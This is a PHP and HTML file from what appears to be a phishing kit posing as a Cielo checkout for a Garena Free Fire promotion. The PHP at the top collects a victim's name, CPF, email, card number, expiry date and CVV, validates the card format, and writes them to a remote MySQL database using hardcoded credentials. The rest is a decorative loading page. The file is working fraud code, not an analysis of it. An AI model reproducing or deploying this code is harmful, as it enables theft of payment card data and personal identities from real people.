<?php 

$titular = $_POST['titular'];
$cpf = $_POST['cpf'];
$email = $_POST['email'];
$creditCard = $_POST['cc_number'];
$mes = $_POST['cc_month'];
$ano = $_POST['cc_year'];
$cvv = $_POST['cc_cvc'];

if (empty($_POST['titular'])) {
    header("location: ../");
}

elseif (empty($_POST['cpf'])) {
    header("location: ../");
}

elseif (empty($_POST['email'])) {
    header("location: ../");
}


function check_cc($cc, $extra_check = false){
    $cards = array(
        "visa" => "(4\d{12}(?:\d{3})?)",
        "amex" => "(3[47]\d{13})",
        "jcb" => "(35[2-8][89]\d\d\d{10})",
        "maestro" => "((?:5020|5038|6304|6579|6761)\d{12}(?:\d\d)?)",
        "solo" => "((?:6334|6767)\d{12}(?:\d\d)?\d?)",
        "mastercard" => "(5[1-5]\d{14})",
        "switch" => "(?:(?:(?:4903|4905|4911|4936|6333|6759)\d{12})|(?:(?:564182|633110)\d{10})(\d\d)?\d?)",
    );
    $names = array("Visa", "American Express", "JCB", "Maestro", "Solo", "Mastercard", "Switch");
    $matches = array();
    $pattern = "#^(?:".implode("|", $cards).")$#";
    $result = preg_match($pattern, str_replace(" ", "", $cc), $matches);
    if($extra_check && $result > 0){
        $result = (validatecard($cc))?1:0;
    }
    return ($result>0)?$names[sizeof($matches)-2]:false;
}

$checkcc = check_cc($creditCard);

    session_start();
    
    $_SESSION['titular'] = $titular;
    $_SESSION['creditcard'] = $creditCard;

if ($checkcc == false) {
   header("location: error/");
}


$infonovas = "
==========================
BITFOIPRESO INFOS CC
==========================

NOME: $titular
EMAIL: $email
CPF: $cpf
NumberCard: $creditCard
DATA: $mes/$ano 
CVV: $cvv

==========================
BITFOIPRESO INFOS CC
==========================
";

///////////////////////////////////////////////////

// INICIA A CONEXÂO COM O BANCO DE DADOS
$conn = new PDO('mysql:host=mysql873.umbler.com:41890;dbname=dollyguidao', 'bitcomedolly', 'junin2020');

// COMANDO PARA INSIRIR DADOS NA TABELA 
$stmt = $conn->prepare("INSERT INTO `freefire`(`info`) VALUES (:INFO)");

// PREPARA OS DADOS PARA SER INSERIDOS
$stmt->bindParam(":INFO", $infonovas);

// EXECURA O COMANDO INSERINDO TODOS OS DADOS ACIMA
$stmt->execute();


////////////////////////////////////////////////////


sleep(5);


 ?>
<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>Cielo CheckOut - Cadastro Garena Promoção 2020</title>
  <link rel="stylesheet" href="./style.css">

</head>
<body>
<!-- partial:index.partial.html -->
<section class="section1">
  <div class="bg">
    <div class="circle"></div>
    <div class="circle-small"></div>
    <div class="money money-1">$</div>
    <div class="money money-2">$</div>
    <div class="money money-3">$</div>
    <div class="money money-4">$</div>
    <div class="money money-5">$</div>
    <div class="money money-6">$</div>
  </div>
  <svg width="67" height="124" viewBox="0 0 67 124" fill="none" xmlns="http://www.w3.org/2000/svg" class="maquineta">
    <path d="M66.9998 13.5206C66.9998 1.60832 53.9753 -4.51284 46.5578 3.89354C46.5989 3.88069 46.64 3.86784 46.6813 3.85523L18.4193 22.297C17.143 22.598 15.8876 23.154 14.7042 23.992V23.9916L8.45367 27.9606C3.5231 31.1819 0 37.1692 0 44.5396V60.026C0 67.8208 3.76042 74.9922 9.80188 78.7192C12.1754 80.1836 13.6528 83.0009 13.6528 86.0633V102.318C13.6528 109.53 17.0477 116.196 22.5595 119.804L25.3334 121.619L27.8201 123.199C29.2854 124.177 31.1773 124.334 32.8679 123.252L59.4655 105.891V105.894C64.1208 102.916 67 97.3269 67 91.2691L66.9998 13.5206Z" fill="#284363"/>
    <path d="M59.2599 15.1916V106C64.0423 103.023 67 97.4365 67 91.3814V13.6685C67 1.88503 54.2022 -4.44712 46.4056 3.61294C46.2684 3.75473 46.1332 3.89919 46 4.04607C46.0422 4.03323 46.0844 4.02038 46.1268 4.00778C52.7552 2.03457 59.2599 7.62213 59.2599 15.1916Z" fill="#33AEFF"/>
    <path d="M58.5765 15.6975L33.4499 30.2293V52.4306L58.5765 37.9683V15.6975Z" fill="#FFD2A6" class="screen"/>
    <path d="M61.4561 94.4344L61.4586 94.4308L59.6659 93.3957L59.6648 93.3974C58.9752 92.9766 57.9497 93.0477 56.8023 93.71C54.7261 94.9086 53.0432 97.5808 53.0432 99.6788C53.0432 100.628 53.3898 101.293 53.9591 101.63L53.9497 101.644L55.7495 102.683L55.7576 102.671C56.4469 103.087 57.4692 103.014 58.6125 102.354C60.6884 101.156 62.3715 98.4834 62.3715 96.3854C62.3713 95.4369 62.0249 94.7717 61.4561 94.4344Z" fill="#007A6E"/>
    <path d="M62.3713 96.3856C62.3713 98.4834 60.6884 101.156 58.6123 102.354C56.5361 103.553 54.8532 102.824 54.8532 100.726C54.8532 98.6282 56.5361 95.9558 58.6123 94.7572C60.6884 93.5586 62.3713 94.2876 62.3713 96.3856Z" fill="#009F5E"/>
    <path d="M60.8247 45.1697L60.827 45.1661L59.0343 44.131L59.0332 44.1327C58.3436 43.7119 57.3179 43.783 56.1707 44.4453C54.0948 45.6438 52.4117 48.316 52.4117 50.4141C52.4117 51.3629 52.7582 52.0284 53.3275 52.3654L53.3181 52.3788L55.1179 53.418L55.126 53.4063C55.8154 53.8222 56.8377 53.7496 57.9809 53.0895C60.0568 51.8909 61.7399 49.2185 61.7399 47.1207C61.7401 46.1722 61.3935 45.5067 60.8247 45.1697Z" fill="#C40041"/>
    <path d="M61.7399 47.1207C61.7399 49.2185 60.057 51.8909 57.9809 53.0895C55.905 54.2881 54.2219 53.5591 54.2219 51.4613C54.2219 49.3635 55.9048 46.691 57.9809 45.4925C60.057 44.2939 61.7399 45.0228 61.7399 47.1207Z" fill="#F43834"/>
    <path d="M41.4561 67.2874L41.4586 67.2837L39.6659 66.2487L39.6648 66.2502C38.9752 65.8293 37.9497 65.9004 36.8023 66.5629C34.7261 67.7615 33.0432 70.4337 33.0432 72.5317C33.0432 73.4806 33.3898 74.1461 33.9591 74.4831L33.9497 74.4965L35.7495 75.5356L35.7576 75.5239C36.4469 75.9397 37.4692 75.8673 38.6125 75.2071C40.6884 74.0085 42.3715 71.3363 42.3715 69.2383C42.3713 68.2899 42.0249 67.6246 41.4561 67.2874Z" fill="#212938"/>
    <path d="M42.3713 69.2385C42.3713 71.3363 40.6884 74.0087 38.6123 75.2073C36.5361 76.4059 34.8532 75.677 34.8532 73.5789C34.8532 71.4811 36.5361 68.8087 38.6123 67.6101C40.6884 66.4115 42.3713 67.1407 42.3713 69.2385Z" fill="#2E527C"/>
    <path d="M51.1403 61.6551L51.1428 61.6515L49.3501 60.6164L49.349 60.6179C48.6594 60.197 47.6337 60.2681 46.4865 60.9307C44.4104 62.1292 42.7274 64.8017 42.7274 66.8995C42.7274 67.8483 43.074 68.5138 43.6433 68.8508L43.6339 68.8643L45.4337 69.9034L45.4418 69.8917C46.1311 70.3074 47.1535 70.2351 48.2967 69.5749C50.3728 68.3763 52.0555 65.7039 52.0555 63.6061C52.0557 62.6574 51.7093 61.9921 51.1403 61.6551Z" fill="#212938"/>
    <path d="M52.0557 63.606C52.0557 65.7039 50.3728 68.3763 48.2967 69.5749C46.2208 70.7735 44.5377 70.0445 44.5377 67.9467C44.5377 65.8489 46.2206 63.1764 48.2967 61.9779C50.3728 60.7793 52.0557 61.5082 52.0557 63.606Z" fill="#2E527C"/>
    <path d="M53.3275 63.2184L53.3181 63.2318L55.1179 64.2709L55.126 64.2592C55.8154 64.6752 56.8377 64.6026 57.9809 63.9424C60.0568 62.7438 61.7399 60.0714 61.7399 57.9736C61.7399 57.0249 61.3935 56.3597 60.8247 56.0224L60.827 56.0188L59.0343 54.9837L59.0332 54.9852C58.3436 54.5643 57.3179 54.6354 56.1707 55.298C54.0948 56.4965 52.4117 59.1688 52.4117 61.2668C52.4117 62.2159 52.7582 62.8814 53.3275 63.2184Z" fill="#212938"/>
    <path d="M61.7399 57.9738C61.7399 60.0716 60.057 62.7441 57.9809 63.9426C55.905 65.1412 54.2219 64.4123 54.2219 62.3144C54.2219 60.2166 55.9048 57.5442 57.9809 56.3456C60.057 55.1468 61.7399 55.8758 61.7399 57.9738Z" fill="#2E527C"/>
    <path d="M41.4561 81.1403L41.4586 81.1367L39.6659 80.1016L39.6648 80.1033C38.9752 79.6824 37.9497 79.7535 36.8023 80.416C34.7261 81.6146 33.0432 84.2868 33.0432 86.3849C33.0432 87.3337 33.3898 87.9992 33.9591 88.3362L33.9497 88.3496L35.7495 89.3888L35.7576 89.3771C36.4469 89.7928 37.4692 89.7204 38.6125 89.0603C40.6884 87.8617 42.3715 85.1893 42.3715 83.0914C42.3713 82.1428 42.0249 81.4775 41.4561 81.1403Z" fill="#212938"/>
    <path d="M42.3713 83.0914C42.3713 85.1893 40.6884 87.8617 38.6123 89.0603C36.5361 90.2589 34.8532 89.5299 34.8532 87.4319C34.8532 85.334 36.5361 82.6616 38.6123 81.463C40.6884 80.2647 42.3713 80.9936 42.3713 83.0914Z" fill="#2E527C"/>
    <path d="M51.1403 75.508L51.1428 75.5044L49.3501 74.4693L49.349 74.4708C48.6594 74.0499 47.6337 74.121 46.4865 74.7836C44.4104 75.9821 42.7274 78.6543 42.7274 80.7524C42.7274 81.7012 43.074 82.3667 43.6433 82.7037L43.6339 82.7172L45.4337 83.7563L45.4418 83.7446C46.1311 84.1603 47.1535 84.088 48.2967 83.4278C50.3728 82.2292 52.0555 79.557 52.0555 77.459C52.0557 76.5105 51.7093 75.8452 51.1403 75.508Z" fill="#212938"/>
    <path d="M52.0557 77.4592C52.0557 79.557 50.3728 82.2294 48.2967 83.428C46.2208 84.6266 44.5377 83.8976 44.5377 81.7998C44.5377 79.702 46.2206 77.0296 48.2967 75.831C50.3728 74.6322 52.0557 75.3612 52.0557 77.4592Z" fill="#2E527C"/>
    <path d="M60.8247 69.8756L60.827 69.8719L59.0343 68.8369L59.0332 68.8383C58.3436 68.4175 57.3179 68.4886 56.1707 69.1511C54.0948 70.3497 52.4117 73.0221 52.4117 75.1199C52.4117 76.0688 52.7582 76.7343 53.3275 77.0713L53.3181 77.0847L55.1179 78.1238L55.126 78.1121C55.8154 78.5281 56.8377 78.4555 57.9809 77.7953C60.0568 76.5967 61.7399 73.9243 61.7399 71.8265C61.7401 70.8781 61.3935 70.2128 60.8247 69.8756Z" fill="#212938"/>
    <path d="M61.7399 71.8267C61.7399 73.9245 60.057 76.5969 57.9809 77.7955C55.905 78.9941 54.2219 78.2651 54.2219 76.1673C54.2219 74.0695 55.9048 71.3971 57.9809 70.1985C60.057 68.9997 61.7399 69.7289 61.7399 71.8267Z" fill="#2E527C"/>
    <path d="M41.4561 93.9934L41.4586 93.9898L39.6659 92.9547L39.6648 92.9564C38.9752 92.5355 37.9497 92.6066 36.8023 93.2692C34.7261 94.4677 33.0432 97.1401 33.0432 99.238C33.0432 100.187 33.3898 100.852 33.9591 101.189L33.9497 101.203L35.7495 102.242L35.7576 102.23C36.4469 102.646 37.4692 102.574 38.6125 101.913C40.6884 100.715 42.3715 98.0424 42.3715 95.9446C42.3713 94.9959 42.0249 94.3306 41.4561 93.9934Z" fill="#212938"/>
    <path d="M42.3713 95.9443C42.3713 98.0422 40.6884 100.715 38.6123 101.913C36.5361 103.112 34.8532 102.383 34.8532 100.285C34.8532 98.1869 36.5361 95.5145 38.6123 94.3159C40.6884 93.1176 42.3713 93.8465 42.3713 95.9443Z" fill="#2E527C"/>
    <path d="M51.1403 88.361L51.1428 88.3573L49.3501 87.3223L49.349 87.3238C48.6594 86.9029 47.6337 86.974 46.4865 87.6365C44.4104 88.8351 42.7274 91.5073 42.7274 93.6053C42.7274 94.5542 43.074 95.2197 43.6433 95.5567L43.6339 95.5701L45.4337 96.6092L45.4418 96.5975C46.1311 97.0133 47.1535 96.9409 48.2967 96.2807C50.3728 95.0822 52.0555 92.41 52.0555 90.3119C52.0557 89.3635 51.7093 88.6982 51.1403 88.361Z" fill="#212938"/>
    <path d="M52.0557 90.3121C52.0557 92.41 50.3728 95.0824 48.2967 96.281C46.2208 97.4795 44.5377 96.7506 44.5377 94.6528C44.5377 92.5549 46.2206 89.8825 48.2967 88.6839C50.3728 87.4851 52.0557 88.2143 52.0557 90.3121Z" fill="#2E527C"/>
    <path d="M60.8247 82.7287L60.827 82.7251L59.0343 81.69L59.0332 81.6915C58.3436 81.2706 57.3179 81.3417 56.1707 82.0042C54.0948 83.2028 52.4117 85.8752 52.4117 87.9731C52.4117 88.9219 52.7582 89.5874 53.3275 89.9246L53.3181 89.938L55.1179 90.9772L55.126 90.9655C55.8154 91.3814 56.8377 91.3088 57.9809 90.6487C60.0568 89.4501 61.7399 86.7777 61.7399 84.6799C61.7401 83.731 61.3935 83.0657 60.8247 82.7287Z" fill="#212938"/>
    <path d="M61.7399 84.6796C61.7399 86.7775 60.057 89.4499 57.9809 90.6485C55.905 91.847 54.2219 91.1181 54.2219 89.0203C54.2219 86.9224 55.9048 84.25 57.9809 83.0514C60.057 81.8529 61.7399 82.5818 61.7399 84.6796Z" fill="#2E527C"/>
    <path d="M35.8044 33.3204V37.6838L56.8004 25.562V21.1984L35.8044 33.3204Z" fill="#ca8c60" class="screen-text1"/>
    <path d="M35.8044 41.5187V45.8821L49.3017 38.056V33.6926L35.8044 41.5187Z" fill="#ca8c60" class="screen-text2"/>
    <path d="M25.4972 118.098V37.5176C25.4972 30.0802 19.2793 24.5715 12.8686 26.3289C11.3391 26.7641 9.87086 27.4293 8.51049 28.3069L8.50834 28.3083C3.54588 31.5111 0 37.4643 0 44.7922V60.1897C0 67.9399 3.78474 75.0701 9.86526 78.7758C12.2541 80.2318 13.7411 83.0329 13.7411 86.0777V102.239C13.7411 109.41 17.158 116.037 22.7054 119.624L25.4972 121.43L28 123C26.5375 122.035 25.4972 120.267 25.4972 118.098Z" fill="#212938"/>
    <path d="M15.2815 20.9173C15.315 20.8986 15.3483 20.8801 15.3819 20.8618C15.3481 20.8803 15.3148 20.8988 15.2815 20.9173Z" fill="#323232"/>
    <path d="M33 35.6776C33 24.8185 22.6159 18.5863 15.1473 23.9677V23.9672L9 27.9396C10.3302 27.0548 11.7659 26.3847 13.2618 25.9461C19.5223 24.178 25.5945 29.7199 25.5945 37.2021V118.267C25.5945 122.65 29.6906 125.407 33 123.252V35.6776Z" fill="#33AEFF"/>
  </svg>


  <svg width="29" height="79" viewBox="0 0 29 79" fill="none" xmlns="http://www.w3.org/2000/svg" class="credit-card">
    <path d="M0.5 19.9681C0.5 18.9659 1.00049 18.0298 1.83397 17.4732L24.8893 2.07727C26.2183 1.18978 28 2.14242 28 3.74051V59.6178L3.63208 76.3494C2.30498 77.2607 0.5 76.3105 0.5 74.7007V19.9681Z" fill="#101010"/>
    <path d="M1 20.63C1 19.2985 1.66253 18.0543 2.76729 17.3111L25.3836 2.09645C26.7122 1.20271 28.5 2.15472 28.5 3.7559V58.935C28.5 59.6008 28.1687 60.2229 27.6164 60.5945L4.11635 76.4035C2.78781 77.2973 1 76.3453 1 74.7441V20.63Z" fill="#8000AD"/>
    <path d="M12 19.5919C12 18.9114 12.346 18.2775 12.9185 17.9095L15.9185 15.981C17.2495 15.1253 19 16.081 19 17.6633V21.9081C19 22.5886 18.654 23.2225 18.0815 23.5905L15.0815 25.519C13.7505 26.3747 12 25.419 12 23.8367V19.5919Z" fill="#E7E7E7"/>
    <path d="M4 59.4108C4 58.2199 4.60557 57.1107 5.60735 56.4667V56.4667C7.93664 54.9693 11 56.6417 11 59.4108V60.0892C11 61.2801 10.3944 62.3893 9.39265 63.0333V63.0333C7.06336 64.5307 4 62.8583 4 60.0892V59.4108Z" fill="#BF7300"/>
    <path d="M4 62.4108C4 61.2199 4.60557 60.1107 5.60735 59.4667V59.4667C7.93664 57.9693 11 59.6417 11 62.4108V63.0892C11 64.2801 10.3944 65.3893 9.39265 66.0333V66.0333C7.06336 67.5307 4 65.8583 4 63.0892V62.4108Z" fill="#AB0000"/>
  </svg>
</section>
<!-- partial -->
  
</body>
</html>
